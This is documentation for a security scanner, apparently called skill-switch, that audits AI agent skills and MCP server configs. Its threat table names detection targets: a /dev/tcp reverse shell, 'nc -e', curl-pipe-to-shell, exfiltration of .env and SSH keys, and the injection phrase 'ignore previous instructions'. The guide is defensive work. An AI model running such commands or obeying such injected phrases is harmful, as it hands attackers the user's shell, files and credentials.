# Auditing AI agent skills & MCP servers for security

AI coding agents — Claude Code, Cursor, Gemini CLI, Windsurf, Zed, GitHub Copilot — increasingly run on **skills** (reusable bundles of instructions + tools) and **MCP servers** (Model Context Protocol servers that expose tools to the agent). Both are, at the end of the day, **files and commands the agent will execute on your machine**. A malicious or compromised one can open a reverse shell, exfiltrate your `.env`, phish for credentials, or quietly turn an MCP server hostile after you've trusted it.

This guide explains the threat model and shows how to audit skills and MCP/agent configs with [skill-switch](https://github.com/rtwsvj/skill-switch) — locally, in CI, with zero telemetry.

```bash
npx @rtwsvj/skill-switch audit            # audit this project's skills / configs
npx @rtwsvj/skill-switch audit --configs  # also scan ~/.claude, MCP, and agent configs
```

## Why skills and MCP servers are a security surface

A skill is Markdown + scripts an agent reads and may execute. An MCP server is a process (often `npx some-package`) or a remote endpoint the agent connects to and calls tools on. You accumulate them across several agents, from many authors, and lose the thread: which are installed where, did that one quietly ask for your AWS keys, is the MCP server still exposing the same tools you vetted last week?

Unlike a normal dependency, these run **inside your agent's trust boundary** — with your shell, your files, your tokens.

## The threat landscape

skill-switch ships 80+ detection rules across these categories (full list: [docs/rules.md](rules.md)):

| Threat | What it looks like | Example ruleIds |
|---|---|---|
| **Reverse shells** | `bash -i >& /dev/tcp/host/port`, `nc -e`, python/perl socket shells | `reverse-shell/*` |
| **Remote download-and-execute** | `curl https://… \| sh`, staged `curl + chmod + exec` | `clickfix/curl-pipe-shell`, `staged/*` |
| **Data exfiltration** | reading `.env` / `~/.ssh` / keychains and POSTing them out | `exfiltration/*` |
| **Credential phishing** | instructions telling the agent to ask the user for tokens/passwords | `credential-theft/*` |
| **Supply-chain** | install from unofficial registries, unpinned `npx pkg@latest` | `supply-chain/*` |
| **Dangerous MCP servers** | a server whose `command` wraps a shell payload, or runs unpinned packages | `mcp/shell-wrapper-*`, `mcp/unpinned-package` |
| **MCP credential exposure** | hardcoded secrets in `env`/`headers`, `user:pass@host` URLs, secrets sent to a remote server | `mcp/header-literal-secret`, `mcp/url-embedded-credential`, `mcp/env-secret-to-remote` |
| **Plaintext / over-broad MCP** | `http://` remote transport, `autoApprove: ["*"]`, filesystem scope `/`, `--no-sandbox` | `mcp/remote-http-plaintext`, `mcp/auto-approve-wildcard`, `mcp/broad-filesystem-scope` |
| **Prompt injection / hidden instructions** | zero-width chars, CSS-hidden text, "ignore previous instructions" | `prompt-injection/*` |
| **Obfuscated payloads** | base64 blobs, invisible characters, ANSI/Trojan-Source tricks | `base64-payload/*`, `invisible-chars/*`, `ansi-injection/*` |

## How to audit

**A single skill or a directory of skills:**

```bash
npx @rtwsvj/skill-switch audit ./my-skill
```

**Your installed agent configs** (Claude Code, Gemini CLI, Cursor, VS Code, Windsurf, Zed — `settings.json` and MCP configs):

```bash
npx @rtwsvj/skill-switch audit --configs
```

The audit exits non-zero when it finds blocking issues (critical/high, or a low overall score), so it doubles as a CI gate. Machine-readable output:

```bash
npx @rtwsvj/skill-switch audit --format sarif > results.sarif   # GitHub code-scanning
npx @rtwsvj/skill-switch audit --format json                    # your own tooling
```

## Putting it in CI

Add the GitHub Action to scan every PR:

```yaml
permissions:
  contents: read
  security-events: write     # to upload SARIF to code-scanning
steps:
  - uses: actions/checkout@v4
  - uses: rtwsvj/skill-switch@v0.7.0
    with:
      args: --configs
```

Two things make this **stick in real repos** rather than getting disabled on day one:

- **Baseline** — an existing repo already has findings. Snapshot them once so CI only fails on *new* issues:
  ```bash
  npx @rtwsvj/skill-switch audit --write-baseline .skill-switch-baseline.json   # accept current state
  npx @rtwsvj/skill-switch audit --baseline .skill-switch-baseline.json         # only new findings fail
  ```
  The baseline fingerprint ignores line numbers, so inserting code above a finding doesn't make it look "new".
- **Inline PR annotations** — `--format github` (or `format: github` on the Action) prints each finding right on the PR diff line, no code-scanning setup required.

Tune severity and suppress known-false-positives with a project policy file `.skill-switch-policy.json` (`failOn`, `suppress`).

## The MCP rug-pull problem

A subtle MCP threat: a server that's benign when you install it, then ships an update that adds a malicious tool — a *rug-pull*. Static config audits (above) catch a lot, but detecting rug-pulls requires comparing a server's **live tool list** against a trusted baseline over time. skill-switch covers the static surface today; runtime MCP scanning is on the [roadmap](roadmap.md).

## Principles

- **Local-first, zero telemetry** — nothing is uploaded; everything runs on your machine.
- **Read-only by default** — `audit` never writes; remediation (`--fix`) is opt-in, dry-run first, and always snapshots before touching disk.
- **Honest about blind spots** — see [known limitations](known-limitations.md).

---

Full rule reference: [docs/rules.md](rules.md) · CI setup: [docs/github-action.md](github-action.md) · Project: [github.com/rtwsvj/skill-switch](https://github.com/rtwsvj/skill-switch)
